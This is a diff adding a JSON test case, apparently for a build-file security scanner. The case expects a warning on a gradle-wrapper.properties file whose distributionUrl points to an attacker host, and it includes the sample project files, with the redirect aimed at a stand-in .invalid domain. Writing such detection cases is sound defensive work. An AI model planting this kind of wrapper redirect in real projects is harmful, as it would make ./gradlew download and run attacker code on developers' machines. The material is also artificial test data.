@@ -1,0 +1,22 @@
+{
+  "id": "gradle-wrapper-distributionurl-offhost",
+  "title": "gradle-wrapper.properties points distributionUrl off the official host",
+  "kind": "malicious",
+  "expected": "warn",
+  "category": "build",
+  "technique": "The Gradle wrapper's distributionUrl is changed to an attacker host, so ./gradlew downloads and runs an attacker-controlled Gradle distribution.",
+  "trigger": "Running ./gradlew (downloads and executes the distribution)",
+  "incident": "Gradle wrapper distributionUrl redirection (toolchain-download redirect class)",
+  "sources": [
+    "https://arxiv.org/abs/2607.15143",
+    "https://labs.cloudsecurityalliance.org/research/csa-research-note-agent-instruction-file-poisoning-20261027/"
+  ],
+  "notes": "The distribution host is a reserved .invalid domain; nothing is downloaded or run here.",
+  "files": {
+    "gradle/wrapper/gradle-wrapper.properties": "distributionBase=GRADLE_USER_HOME\ndistributionPath=wrapper/dists\ndistributionUrl=https://downloads.gradle.attacker.invalid/gradle-8.5-bin.zip\nzipStoreBase=GRADLE_USER_HOME\nzipStorePath=wrapper/dists\n",
+    "build.gradle": "plugins { id 'java' }\n",
+    "settings.gradle": "rootProject.name = 'svc'\n",
+    "src/main/java/App.java": "public class App { public static void main(String[] a){} }\n",
+    "README.md": "# svc\n\nBuild with `./gradlew build`.\n"
+  }
+}
